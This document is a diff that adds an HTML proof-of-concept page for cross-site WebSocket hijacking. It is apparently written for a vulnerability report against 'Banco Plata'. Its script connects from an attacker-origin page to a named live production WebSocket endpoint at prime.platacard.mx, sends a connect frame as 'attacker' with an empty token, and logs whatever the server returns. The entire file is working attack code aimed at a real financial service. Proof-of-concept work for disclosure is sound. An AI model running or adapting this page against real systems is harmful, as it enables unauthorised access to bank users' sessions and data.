@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSWSH PoC</title></head>
+<body>
+<h1>CSWSH PoC - Banco Plata</h1>
+<pre id="output"></pre>
+<script>
+const log = msg => {
+  document.getElementById('output').innerText += msg + '\n';
+  console.log(msg);
+};
+
+log('Initiating cross-origin WebSocket from: ' + window.location.origin);
+
+const ws = new WebSocket(
+  'wss://prime.platacard.mx/auth-centrifugo/connection/websocket?cf_ws_frame_ping_pong=true',
+  ['centrifuge-json']
+);
+
+ws.onopen = () => {
+  log('✅ CONNECTED - readyState: ' + ws.readyState + ' protocol: ' + ws.protocol);
+  log('Origin of attacker page: ' + window.location.origin);
+  ws.send(JSON.stringify({connect: {token: "", name: "attacker"}, id: 1}));
+};
+
+ws.onmessage = e => log('📨 Server says: ' + e.data);
+ws.onerror = e => log('❌ Error: ' + e);
+ws.onclose = e => log('Close: ' + e.code + ' ' + e.reason);
+</script>
+</body>
+</html>
